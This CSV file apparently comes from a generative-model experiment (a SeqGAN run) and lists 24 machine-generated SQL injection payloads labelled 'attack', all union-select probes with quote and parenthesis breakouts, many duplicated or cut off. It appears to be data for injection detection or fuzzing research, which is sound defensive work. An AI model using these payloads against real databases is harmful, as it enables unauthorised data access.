label,payload,family,payload_type,method,run_id,sample_index
attack,"1  )    union all select null,null,null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,0
attack,"1'  )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,1
attack,"1'  )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,2
attack,"1   )    )     )     )   union all select null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,3
attack,"1'  )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,4
attack,"1'  )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,5
attack,"1'  )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,6
attack,"1%""   )    )    union all select null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,7
attack,"1  )   union all select null,null,null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,8
attack,"1'  )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,9
attack,"1 union all select null,null,null,null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,10
attack,"1%'  )   union all select null,null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,11
attack,"1%""   )    )    union all select null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,12
attack,"1' union all select null,null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,13
attack,"1""   )    )    union all select null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,14
attack,"1%""   )    )    union all select null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,15
attack,"1' union all select null,null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,16
attack,"1'  )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,17
attack,"1%'  )     )   union all select null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,18
attack,"1""   )    )    union all select null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,19
attack,"1%""   )    )    union all select null,null,null,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,20
attack,"1' union all select null,null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,21
attack,"1'  )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,22
attack,"1)     )   union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,23
